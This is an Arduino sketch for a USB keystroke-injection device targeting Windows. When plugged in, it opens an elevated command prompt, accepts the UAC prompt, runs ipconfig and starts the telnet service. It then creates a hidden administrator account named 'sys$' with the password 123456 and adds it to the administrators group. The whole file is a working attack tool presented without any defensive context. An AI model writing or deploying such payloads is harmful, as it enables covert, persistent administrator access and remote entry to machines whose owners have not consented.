#include"Keyboard.h"
void setup() {
  Keyboard.begin();//开始键盘通讯 
  delay(2000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键  
  delay(500);
  Keyboard.release(KEY_LEFT_GUI);//释放win 
  delay(300);
  Keyboard.press(KEY_LEFT_SHIFT);
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("cmd ");

  Keyboard.press(KEY_LEFT_CTRL);
  delay(100);
  Keyboard.press(KEY_LEFT_SHIFT);
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  delay(1000);
  Keyboard.press('y');
  delay(1000);
  Keyboard.releaseAll();
  delay(7000);//延迟不宜过短，cmd初始化需要时间
  //------------------start
  Keyboard.println("ipconfig");
  delay(1000); 
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(100);
  //===========
  Keyboard.println("net start telnet");
  delay(1000); 
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(5000);
  // sys 123456 隐藏管理员添加
  Keyboard.println("net user sys$ 123456 /add");
  delay(1000); 
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(5000);
  Keyboard.println("net localgroup administrators sys$ /add");
  delay(1000); 
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(1500);
  //===========
  Keyboard.println("exit");
  delay(1000); 
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  
  Keyboard.end();//结束键盘通讯 
} 

void loop() {

}
